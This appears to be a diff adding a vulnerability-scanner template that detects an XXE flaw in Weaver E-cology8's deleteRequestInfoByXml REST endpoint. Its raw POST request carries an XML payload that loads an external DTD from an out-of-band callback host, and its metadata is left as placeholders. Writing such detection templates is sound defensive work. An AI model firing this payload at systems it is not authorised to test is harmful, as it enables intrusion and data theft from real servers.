@@ -1,0 +1,27 @@
+id: E-cology-deleteRequestInfoByXml-xxe
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 泛微E-cology8 deleteRequestInfoByXml存在XXE漏洞
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        POST /rest/ofs/deleteRequestInfoByXml HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Content-Length: 128
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE syscode SYSTEM "http://{{interactsh-url}}">
+        <M><syscode>&send;</syscode></M>
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
